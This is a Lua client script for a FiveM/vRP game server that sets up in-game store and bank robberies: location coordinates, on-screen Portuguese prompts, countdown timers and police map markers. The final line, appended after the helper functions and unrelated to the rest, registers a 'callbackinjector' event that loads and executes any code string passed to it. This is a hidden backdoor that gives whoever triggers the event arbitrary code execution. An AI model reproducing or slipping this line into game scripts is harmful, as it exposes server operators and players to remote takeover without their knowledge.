-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
-- CONEXÃO
-----------------------------------------------------------------------------------------------------------------------------------------
src = {}
Tunnel.bindInterface("vrp_robberys",src)
vSERVER = Tunnel.getInterface("vrp_robberys")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local robbery = false
local timedown = 0
local robmark = nil
-----------------------------------------------------------------------------------------------------------------------------------------
-- ROBBERS
-----------------------------------------------------------------------------------------------------------------------------------------
local robbers = {
	--DEPARTAMENTOS
	[1] = { ['x'] = 2549.20, ['y'] = 384.92, ['z'] = 108.62 }, --OK
	[2] = { ['x'] = -709.18, ['y'] = -904.26, ['z'] = 19.21 }, -- OK
	[3] = { ['x'] = -3250.06, ['y'] = 1004.43, ['z'] = 12.83 }, --OK
	[4] = { ['x'] = 1734.88, ['y'] = 6420.87, ['z'] = 35.03 }, --OK
	[5] = { ['x'] = 546.36, ['y'] = 2662.74, ['z'] = 42.15 }, --ok
	[6] = { ['x'] = 1160.16, ['y'] = -314.12, ['z'] = 69.20 }, --OK
	[7] = { ['x'] = 28.27, ['y'] = -1339.78, ['z'] = 29.49 }, -- OK
	[8] = { ['x'] = 378.08, ['y'] = 332.77, ['z'] = 103.56 }, -- OK
	[9] = { ['x'] = -1828.58, ['y'] = 799.10, ['z'] = 138.17 }, -- OK
	[10] = { ['x'] = -43.4030, ['y'] = -1748.3175, ['z'] = 29.4210 }, -- OK 
	[11] = { ['x'] = 1959.26757, ['y'] = 3748.9213, ['z'] = 32.343 }, -- OK  
	[12] = { ['x'] = 2672.7700, ['y'] = 3286.6252, ['z'] = 55.241 }, -- OK 
	[13] = { ['x'] = 1707.76, ['y'] = 4920.31, ['z'] = 42.0636 }, -- OK
	[14] = { ['x'] = -2959.63427, ['y'] = 387.15, ['z'] = 14.04 }, --OK
	[15] = { ['x'] = 1126.673, ['y'] = -980.17, ['z'] = 45.41 }, --OK 
	[16] = { ['x'] = -1478.85, ['y'] = -375.29, ['z'] = 39.16 }, --OK
	[17] = { ['x'] = -1220.67, ['y'] =-915.902, ['z'] = 11.32 },  --OK
	--------------BANCOS-------------
	[18] = { ['x'] = 147.34, ['y'] = -1045.03, ['z'] = 29.36 },
	[19] = { ['x'] = -1211.2452, ['y'] = -335.3711, ['z'] = 37.781 }, 
	[20] = { ['x'] = -2957.64, ['y'] = 481.8735, ['z'] = 15.69 },
	[21] = { ['x'] = -103.311, ['y'] = 6478.332, ['z'] = 31.6267 },
	[22] = { ['x'] = 311.62, ['y'] = -283.52, ['z'] = 54.164 }, 
	[23] = { ['x'] = -353.47, ['y'] = -54.414, ['z'] = 49.036 }, 
    --------------

	[24] = { ['x'] = 2337.1, ['y'] = 3050.29, ['z'] = 48.16 },  -- ferrovelho
	[25] = { ['x'] = -155.78, ['y'] = 6139.38, ['z'] = 32.34 }, -- galinheiro
	[26] = { ['x'] = 163.3, ['y'] = -3336.72, ['z'] = 5.94 }, -- porto
	[27] = { ['x'] = -543.83, ['y'] = -198.34, ['z'] = 47.414 }, -- prefeitura 
	[28] = { ['x'] = 1982.37, ['y'] = 3053.38, ['z'] = 47.22 } --bar
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- ROBBERSBUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local sleep = 100	
		if robbery then	
			sleep = 1			
			drawText("PARA CANCELAR O ROUBO APERTE ~r~'F6'",4,0.5,0.92,0.50,255,255,255,130)
			drawText("AGUARDE ~g~"..timedown.." SEGUNDOS~w~ ATÉ QUE TERMINE O ROUBO",4,0.5,0.9,0.46,255,255,255,170)
			if IsControlJustPressed(0,167) then
				robbery = false
				vSERVER.stopRobbery()
			end
		end
		Citizen.Wait(sleep)
	end
end)

Citizen.CreateThread(function()
	while true do
		local skips = 1000
	    for y , j in pairs(robbers) do
		    local distancia = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),j.x,j.y,j.z,true)
		    if distancia <= 10 then
			IsPerto = true
			 if not robbery then
				local ped = PlayerPedId()
				local x,y,z = table.unpack(GetEntityCoords(ped))
				for k,v in pairs(robbers) do
					local distance = Vdist(x,y,z,v.x,v.y,v.z)
					if distance <= 1.1 and GetEntityHealth(ped) > 101 then
						skips = 4
						drawText("PRESSIONE  ~r~G~w~  PARA INICIAR O ROUBO",4,0.5,0.90,0.50,255,255,255,200)
						skips = 4
						DrawMarker(2,v.x,v.y,v.z-0.4,0,0,0,0,180.0,130.0,0.3,0.3,0.3,255,255,255,50,1,0,0,1)
						skips = 4
						DrawMarker(27,v.x,v.y,v.z-1.0,0,0,0,0,180.0,130.0,0.5,0.5,0.5,255,255,255,50,0,0,0,1)
						if IsControlJustPressed(0,183) and timedown <= 0 then
						if timedown <= 0 then
							timedown = 3
							if vSERVER.checkPolice() then
								vSERVER.startRobbery(k,v.x,v.y,v.z)
								sleep = 5
							end
						end
					end
				end
			   end
			 end
		    end
	    end
		Citizen.Wait(skips)
    end
end)



-----------------------------------------------------------------------------------------------------------------------------------------
-- STARTROBBERY
-----------------------------------------------------------------------------------------------------------------------------------------
function src.startRobbery(time,x2,y2,z2)
	robbery = true
	timedown = time
	SetPedComponentVariation(PlayerPedId(),5,45,0,2)
	Citizen.CreateThread(function()
		while robbery do
			Citizen.Wait(5)
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local distance = Vdist(x,y,z,x2,y2,z2)
			if distance >= 10.0 then
				robbery = false
				vSERVER.stopRobbery()
			end
		end
	end)
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- STARTROBBERYPOLICE
-----------------------------------------------------------------------------------------------------------------------------------------
function src.startRobberyPolice(x,y,z,localidade)
	if not DoesBlipExist(robmark) then
		robmark = AddBlipForCoord(x,y,z)
		SetBlipScale(robmark,0.5)
		SetBlipSprite(robmark,161)
		SetBlipColour(robmark,59)
		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString("Roubo: "..localidade)
		EndTextCommandSetBlipName(robmark)
		SetBlipAsShortRange(robmark,false)
		SetBlipRoute(robmark,true)
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- STOPROBBERYPOLICE
-----------------------------------------------------------------------------------------------------------------------------------------
function src.stopRobberyPolice()
	if DoesBlipExist(robmark) then
		RemoveBlip(robmark)
		robmark = nil
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- TIMEDOWN
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if timedown >= 1 then
			timedown = timedown - 1
			if timedown == 0 then
				robbery = false
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- DRAWTEXT
-----------------------------------------------------------------------------------------------------------------------------------------
function drawText(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)